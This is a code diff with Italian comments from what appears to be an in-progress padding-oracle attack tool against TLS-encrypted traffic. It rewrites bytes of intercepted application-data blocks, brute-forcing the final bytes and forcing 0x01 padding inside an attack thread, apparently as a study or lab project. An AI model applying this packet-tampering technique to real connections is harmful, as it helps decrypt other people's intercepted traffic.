@@ -400,7 +400,12 @@ int analyze_application_data(Byte *payload, int payload_len){
 
 }
 
+//se si tratta di prima modifica, provare in coppia i 2 byte
+//se si tratta di modifica successiva alla prima, impostare il valore dell'ultimo byte in modo tale da inettare 0x01 come padding e modificare il penultimo byte
+//in modo da provare tutti i valori possibili 
+
 //function to modify the packet
+/*
 void modify_packet(int block_pos, int byte_pos){
 
   Byte *prec_data = data_packet->data;
@@ -418,12 +423,34 @@ void modify_packet(int block_pos, int byte_pos){
       //printf("valore del penultimo byte: %02x, valore dell'ultimo byte: %02x \n", val_penultimate_byte, val_last_byte);
     }
   }else{ 
+    //va regolato in base alla dimensione dei dati (se 42 byte o multiplo di 42 byte)
     data_packet->data[5 + ((block_pos-1) * 16 ) + byte_pos] = single_byte;
     single_byte = (single_byte + 1) % 0x100;
   }
   
   print_blocks(data_packet->data, data_packet->data_len);
 
+}*/
+
+void modify_packet(bool first_modification){
+
+  //l'hardcoded del blocco va poi regolato in base alla dimensione dei dati (se 42 byte o se multiplo di 42 byte) 
+  if(first_modification){
+    modify_last_bytes(data_packet, 4, val_penultimate_byte, val_last_byte);
+    if(val_last_byte == 0xFF){
+      val_last_byte = 0x00;
+      val_penultimate_byte = (val_penultimate_byte +1) % 0x100;
+    }else{
+      val_last_byte = (val_last_byte + 1) % 0x100;
+      //printf("valore del penultimo byte: %02x, valore dell'ultimo byte: %02x \n", val_penultimate_byte, val_last_byte);
+    }
+  }else{
+    data_packet->data[5 + ((4-1) * 16 ) + 14] = 0x01; //non devo mettere 0x01 ma il valore che mi permette di ottenere 0x01 in chiaro come padding
+    data_packet->data[5 + ((4-1) * 16 ) + 13] = single_byte; //modifico il penultimo byte
+    single_byte = (single_byte + 1) % 0x100;
+  }
+
+  print_blocks(data_packet->data, data_packet->data_len);
 }
 
 
@@ -537,6 +564,7 @@ void *do_attack_thread(void *arg){
 
   struct timespec start, stop;
   char *server_interface = get_server_interface(ip_server, port_server);
+  bool first_attack = true;
   printf("server interface: %s", server_interface);
 
   while(1==1){
@@ -555,7 +583,10 @@ void *do_attack_thread(void *arg){
     //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
     print_data_blocks(data_packet->data, data_packet->data_len);
     
-    modify_packet(4,14);
+    //se si tratta di prima modifica, provare in coppia i 2 byte
+    //se si tratta di modifica successiva alla prima, impostare il valore dell'ultimo byte in modo tale da inettare 0x01 come padding e modificare il penultimo byte
+    //in modo da provare tutti i valori possibili 
+    modify_packet(first_attack);
 
     //printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
     //print_data_blocks(data_packet->data, data_packet->data_len);
